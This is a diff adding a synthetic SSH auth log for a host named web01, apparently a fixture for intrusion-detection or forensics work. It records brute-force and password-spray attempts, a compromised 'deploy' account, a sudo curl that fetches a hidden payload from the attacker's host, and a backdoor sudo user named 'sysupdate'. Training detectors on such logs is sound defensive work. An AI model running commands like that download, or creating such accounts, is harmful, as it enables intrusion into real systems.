@@ -1,0 +1,80 @@
+Oct 27 08:47:00 web01 sshd[7867]: Accepted publickey for mlee from 10.20.1.18 port 49489 ssh2: ED25519 SHA256:abc
+Oct 27 09:00:00 web01 sshd[2013]: Accepted publickey for mlee from 10.20.1.17 port 47315 ssh2: ED25519 SHA256:abc
+Oct 27 10:00:00 web01 sudo:     jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Oct 27 10:27:00 web01 sshd[6054]: Accepted publickey for mlee from 10.20.1.17 port 58707 ssh2: ED25519 SHA256:abc
+Oct 27 11:00:00 web01 sshd[5911]: Failed password for asmith from 10.20.1.33 port 51122 ssh2
+Oct 27 11:30:00 web01 sshd[8005]: Accepted publickey for asmith from 10.20.1.53 port 57423 ssh2: ED25519 SHA256:abc
+Oct 27 13:21:00 web01 sshd[6924]: Accepted publickey for asmith from 10.20.1.47 port 54849 ssh2: ED25519 SHA256:abc
+Oct 27 13:31:00 web01 sshd[2186]: Accepted publickey for jdoe from 10.20.1.35 port 41582 ssh2: ED25519 SHA256:abc
+Oct 27 14:21:00 web01 sshd[1976]: Accepted publickey for jdoe from 10.20.1.45 port 42057 ssh2: ED25519 SHA256:abc
+Oct 27 15:08:00 web01 sshd[7955]: Accepted publickey for jdoe from 10.20.1.25 port 42972 ssh2: ED25519 SHA256:abc
+Oct 27 16:39:00 web01 sshd[8104]: Accepted publickey for jdoe from 10.20.1.12 port 42816 ssh2: ED25519 SHA256:abc
+Oct 27 17:08:00 web01 sshd[1950]: Accepted publickey for jdoe from 10.20.1.33 port 59096 ssh2: ED25519 SHA256:abc
+Oct 27 17:33:00 web01 sshd[4078]: Accepted publickey for mlee from 10.20.1.21 port 43376 ssh2: ED25519 SHA256:abc
+Oct 27 17:50:00 web01 sshd[4622]: Accepted publickey for mlee from 10.20.1.35 port 41624 ssh2: ED25519 SHA256:abc
+Oct 28 02:10:00 web01 sshd[5070]: Failed password for root from 203.0.113.45 port 50000 ssh2
+Oct 28 02:10:09 web01 sshd[3945]: Failed password for root from 203.0.113.45 port 50001 ssh2
+Oct 28 02:10:18 web01 sshd[4999]: Failed password for root from 203.0.113.45 port 50002 ssh2
+Oct 28 02:10:27 web01 sshd[2341]: Failed password for root from 203.0.113.45 port 50003 ssh2
+Oct 28 02:10:36 web01 sshd[5919]: Failed password for root from 203.0.113.45 port 50004 ssh2
+Oct 28 02:10:45 web01 sshd[9604]: Failed password for root from 203.0.113.45 port 50005 ssh2
+Oct 28 02:10:54 web01 sshd[9111]: Failed password for root from 203.0.113.45 port 50006 ssh2
+Oct 28 02:11:03 web01 sshd[6627]: Failed password for root from 203.0.113.45 port 50007 ssh2
+Oct 28 02:11:12 web01 sshd[8353]: Failed password for root from 203.0.113.45 port 50008 ssh2
+Oct 28 02:11:21 web01 sshd[5717]: Failed password for root from 203.0.113.45 port 50009 ssh2
+Oct 28 02:11:30 web01 sshd[2199]: Failed password for root from 203.0.113.45 port 50010 ssh2
+Oct 28 02:11:39 web01 sshd[2934]: Failed password for root from 203.0.113.45 port 50011 ssh2
+Oct 28 02:11:48 web01 sshd[9387]: Failed password for root from 203.0.113.45 port 50012 ssh2
+Oct 28 02:11:57 web01 sshd[7850]: Failed password for root from 203.0.113.45 port 50013 ssh2
+Oct 28 02:12:06 web01 sshd[3702]: Failed password for root from 203.0.113.45 port 50014 ssh2
+Oct 28 02:12:15 web01 sshd[6604]: Failed password for root from 203.0.113.45 port 50015 ssh2
+Oct 28 02:12:24 web01 sshd[3490]: Failed password for root from 203.0.113.45 port 50016 ssh2
+Oct 28 02:12:33 web01 sshd[9011]: Failed password for root from 203.0.113.45 port 50017 ssh2
+Oct 28 02:12:42 web01 sshd[7909]: Failed password for root from 203.0.113.45 port 50018 ssh2
+Oct 28 02:12:51 web01 sshd[1642]: Failed password for root from 203.0.113.45 port 50019 ssh2
+Oct 28 02:13:00 web01 sshd[2271]: Failed password for root from 203.0.113.45 port 50020 ssh2
+Oct 28 02:13:09 web01 sshd[6140]: Failed password for root from 203.0.113.45 port 50021 ssh2
+Oct 28 02:13:18 web01 sshd[6572]: Failed password for root from 203.0.113.45 port 50022 ssh2
+Oct 28 02:13:27 web01 sshd[6737]: Failed password for root from 203.0.113.45 port 50023 ssh2
+Oct 28 02:13:36 web01 sshd[9137]: Failed password for root from 203.0.113.45 port 50024 ssh2
+Oct 28 02:13:45 web01 sshd[8474]: Failed password for root from 203.0.113.45 port 50025 ssh2
+Oct 28 02:13:54 web01 sshd[2126]: Failed password for root from 203.0.113.45 port 50026 ssh2
+Oct 28 02:14:03 web01 sshd[2533]: Failed password for root from 203.0.113.45 port 50027 ssh2
+Oct 28 02:14:12 web01 sshd[5422]: Failed password for root from 203.0.113.45 port 50028 ssh2
+Oct 28 02:14:21 web01 sshd[8767]: Failed password for root from 203.0.113.45 port 50029 ssh2
+Oct 28 02:14:29 web01 sshd[2064]: Invalid user admin from 203.0.113.45 port 50030
+Oct 28 02:14:30 web01 sshd[1994]: Failed password for invalid user admin from 203.0.113.45 port 50030 ssh2
+Oct 28 02:14:38 web01 sshd[6072]: Invalid user admin from 203.0.113.45 port 50031
+Oct 28 02:14:39 web01 sshd[8301]: Failed password for invalid user admin from 203.0.113.45 port 50031 ssh2
+Oct 28 02:14:47 web01 sshd[5662]: Invalid user admin from 203.0.113.45 port 50032
+Oct 28 02:14:48 web01 sshd[7320]: Failed password for invalid user admin from 203.0.113.45 port 50032 ssh2
+Oct 28 02:14:56 web01 sshd[6685]: Invalid user admin from 203.0.113.45 port 50033
+Oct 28 02:14:57 web01 sshd[1369]: Failed password for invalid user admin from 203.0.113.45 port 50033 ssh2
+Oct 28 02:15:05 web01 sshd[8564]: Invalid user admin from 203.0.113.45 port 50034
+Oct 28 02:15:06 web01 sshd[6823]: Failed password for invalid user admin from 203.0.113.45 port 50034 ssh2
+Oct 28 02:15:14 web01 sshd[3753]: Invalid user admin from 203.0.113.45 port 50035
+Oct 28 02:15:15 web01 sshd[2918]: Failed password for invalid user admin from 203.0.113.45 port 50035 ssh2
+Oct 28 02:15:23 web01 sshd[9088]: Invalid user admin from 203.0.113.45 port 50036
+Oct 28 02:15:24 web01 sshd[1965]: Failed password for invalid user admin from 203.0.113.45 port 50036 ssh2
+Oct 28 02:15:32 web01 sshd[4575]: Invalid user admin from 203.0.113.45 port 50037
+Oct 28 02:15:33 web01 sshd[5709]: Failed password for invalid user admin from 203.0.113.45 port 50037 ssh2
+Oct 28 02:15:41 web01 sshd[3119]: Invalid user admin from 203.0.113.45 port 50038
+Oct 28 02:15:42 web01 sshd[5056]: Failed password for invalid user admin from 203.0.113.45 port 50038 ssh2
+Oct 28 02:15:50 web01 sshd[7519]: Invalid user admin from 203.0.113.45 port 50039
+Oct 28 02:15:51 web01 sshd[7405]: Failed password for invalid user admin from 203.0.113.45 port 50039 ssh2
+Oct 28 02:47:00 web01 sshd[8053]: Failed password for deploy from 203.0.113.77 port 42000 ssh2
+Oct 28 02:47:20 web01 sshd[5561]: Failed password for deploy from 203.0.113.77 port 42001 ssh2
+Oct 28 02:47:40 web01 sshd[7804]: Failed password for deploy from 203.0.113.77 port 42002 ssh2
+Oct 28 02:48:00 web01 sshd[6878]: Failed password for deploy from 203.0.113.77 port 42003 ssh2
+Oct 28 02:48:20 web01 sshd[7233]: Failed password for deploy from 203.0.113.77 port 42004 ssh2
+Oct 28 02:50:00 web01 sshd[4780]: Accepted password for deploy from 203.0.113.77 port 42010 ssh2
+Oct 28 02:52:00 web01 sudo:   deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/.x http://203.0.113.77/x
+Oct 28 02:53:00 web01 useradd: new user: name=sysupdate, UID=1005, GID=1005, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/1
+Oct 28 02:53:10 web01 usermod: add 'sysupdate' to group 'sudo'
+Oct 28 03:00:00 web01 sshd[9134]: Failed password for jdoe from 198.51.100.23 port 41000 ssh2
+Oct 28 03:02:00 web01 sshd[2320]: Failed password for asmith from 198.51.100.23 port 41001 ssh2
+Oct 28 03:04:00 web01 sshd[3725]: Failed password for mlee from 198.51.100.23 port 41002 ssh2
+Oct 28 03:06:00 web01 sshd[8359]: Failed password for backup from 198.51.100.23 port 41003 ssh2
+Oct 28 03:08:00 web01 sshd[7580]: Failed password for svc_web from 198.51.100.23 port 41004 ssh2
+Oct 28 03:10:00 web01 sshd[5552]: Failed password for oracle from 198.51.100.23 port 41005 ssh2
+Oct 28 03:12:00 web01 sshd[3243]: Failed password for deploy from 198.51.100.23 port 41006 ssh2
